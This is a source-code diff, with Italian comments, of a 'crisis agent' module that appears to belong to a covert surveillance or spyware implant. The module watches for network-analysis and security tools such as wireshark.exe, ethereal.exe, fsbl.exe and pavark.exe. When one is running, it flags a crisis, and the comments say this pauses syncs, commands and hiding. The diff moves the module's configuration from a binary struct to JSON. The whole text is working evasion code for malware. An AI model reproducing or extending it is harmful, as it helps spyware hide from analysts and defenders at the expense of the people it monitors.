@@ -2,8 +2,8 @@ HANDLE hCrisisThread = NULL;
 BOOL bPM_CrisisAgentStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
 BOOL bPM_crcp = FALSE; // Semaforo per l'uscita del thread
 
-BOOL network_crisis = NULL; // Se deve fermare le sync
-BOOL system_crisis = NULL;  // Se deve fermare i comandi e l'hiding
+//extern BOOL network_crisis; // Se deve fermare le sync
+//extern BOOL system_crisis;  // Se deve fermare i comandi e l'hiding
 
 BOOL cr_check_system = FALSE;
 BOOL cr_check_network = FALSE;
@@ -18,17 +18,6 @@ DWORD process_crisis_network_count = 0;
 
 WCHAR process_crisis_system[MAX_DYNAMIC_CRISIS_SYSTEM+EMBEDDED_CRISIS_SYSTEM][MAX_PATH];
 WCHAR process_crisis_network[MAX_DYNAMIC_CRISIS_NETWORK+EMBEDDED_CRISIS_NETWORK][MAX_PATH];
-
-#pragma pack(4)
-typedef struct {
-	DWORD unused;
-	BOOL check_network;
-	BOOL check_system;
-	DWORD network_process_count;
-	DWORD system_process_count;
-	WCHAR process_names[1];
-} crisis_conf_struct;
-#pragma pack()
 
 // Funzione esportata per vedere se e' in un momento di crisi
 BOOL IsCrisisNetwork()
@@ -145,12 +134,11 @@ DWORD __stdcall PM_CrisisAgentStartStop(BOOL bStartFlag, BOOL bReset)
 
 
 
-DWORD __stdcall PM_CrisisAgentInit(BYTE *conf_ptr, BOOL bStartFlag)
+DWORD __stdcall PM_CrisisAgentInit(JSONObject elem)
 {
+	JSONObject network, hook;
+	JSONArray network_array, hook_array;
 	DWORD i;
-	WCHAR *process_name;
-
-	crisis_conf_struct *crisis_conf = (crisis_conf_struct *)conf_ptr;
 
 	wcscpy(process_crisis_network[0], L"wireshark.exe");
 	wcscpy(process_crisis_network[1], L"ethereal.exe");
@@ -159,53 +147,47 @@ DWORD __stdcall PM_CrisisAgentInit(BYTE *conf_ptr, BOOL bStartFlag)
 	wcscpy(process_crisis_system[0], L"fsbl.exe");
 	wcscpy(process_crisis_system[1], L"pavark.exe");
 		
-	if (crisis_conf) {
-		cr_check_network = crisis_conf->check_network;
-		cr_check_system = crisis_conf->check_system;
+	// Se non ci sono i due oggetti allora non lo inizializza
+	if (!elem[L"network"]->IsObject() || !elem[L"hook"]->IsObject())
+		return 1;
 
-		process_crisis_network_count =  crisis_conf->network_process_count;
-		process_crisis_system_count  =  crisis_conf->system_process_count;
+	network = elem[L"network"]->AsObject();
+	hook = elem[L"hook"]->AsObject();
+	cr_check_network = (BOOL) network[L"enabled"]->AsBool();
+	cr_check_system = (BOOL) hook[L"enabled"]->AsBool();
 
-		if (process_crisis_network_count > MAX_DYNAMIC_CRISIS_NETWORK)
-			process_crisis_network_count = MAX_DYNAMIC_CRISIS_NETWORK;
-		if (process_crisis_system_count > MAX_DYNAMIC_CRISIS_SYSTEM)
-			process_crisis_system_count = MAX_DYNAMIC_CRISIS_SYSTEM;
+	network_array = network[L"processes"]->AsArray();
+	hook_array = hook[L"processes"]->AsArray();
 
-		process_crisis_network_count += EMBEDDED_CRISIS_NETWORK;
-		process_crisis_system_count  += EMBEDDED_CRISIS_SYSTEM;
+	process_crisis_network_count = network_array.size();
+	process_crisis_system_count = hook_array.size();
 
-		process_name = crisis_conf->process_names;
-		for (i=EMBEDDED_CRISIS_NETWORK; i<process_crisis_network_count; i++) {
-			wcscpy(process_crisis_network[i], process_name);
-			process_name += (wcslen(process_name) + 1);
-		}
-		for (i=EMBEDDED_CRISIS_SYSTEM; i<process_crisis_system_count; i++) {
-			wcscpy(process_crisis_system[i], process_name);
-			process_name += (wcslen(process_name) + 1);
-		}
-	} else {
-		cr_check_system = FALSE;
-		cr_check_network = FALSE;
-		process_crisis_network_count = EMBEDDED_CRISIS_NETWORK;
-		process_crisis_system_count = EMBEDDED_CRISIS_SYSTEM;
-	}
+	if (process_crisis_network_count > MAX_DYNAMIC_CRISIS_NETWORK)
+		process_crisis_network_count = MAX_DYNAMIC_CRISIS_NETWORK;
+	if (process_crisis_system_count > MAX_DYNAMIC_CRISIS_SYSTEM)
+		process_crisis_system_count = MAX_DYNAMIC_CRISIS_SYSTEM;
+
+	process_crisis_network_count += EMBEDDED_CRISIS_NETWORK;
+	process_crisis_system_count  += EMBEDDED_CRISIS_SYSTEM;
+
+	for (i=0; i<network_array.size(); i++) 
+		wcscpy(process_crisis_network[i+EMBEDDED_CRISIS_NETWORK], network_array[i]->AsString().c_str());
+
+	for (i=0; i<hook_array.size(); i++) 
+		wcscpy(process_crisis_system[i+EMBEDDED_CRISIS_SYSTEM], hook_array[i]->AsString().c_str());
 
 	// All'inizio le crisi sono disattivate, sara' il thread ad attivarle
 	network_crisis = FALSE;
 	system_crisis = FALSE;
 	AM_IPCAgentStartStop(PM_CRISISAGENT, FALSE);
 
-	PM_CrisisAgentStartStop(bStartFlag, TRUE);
 	return 1;
 }
 
 
 void PM_CrisisAgentRegister()
 {
-	// Non ha nessuna funzione di Dispatch
-	AM_MonitorRegister(PM_CRISISAGENT, NULL, (BYTE *)PM_CrisisAgentStartStop, (BYTE *)PM_CrisisAgentInit, NULL);
-
-	// Inizialmente i monitor devono avere una configurazione di default nel caso
-	// non siano referenziati nel file di configurazione (partono comunque come stoppati).
-	PM_CrisisAgentInit(NULL, FALSE);
+	network_crisis = FALSE;
+	system_crisis = FALSE;		
+	AM_MonitorRegister(L"crisis", PM_CRISISAGENT, NULL, (BYTE *)PM_CrisisAgentStartStop, (BYTE *)PM_CrisisAgentInit, NULL);
 }
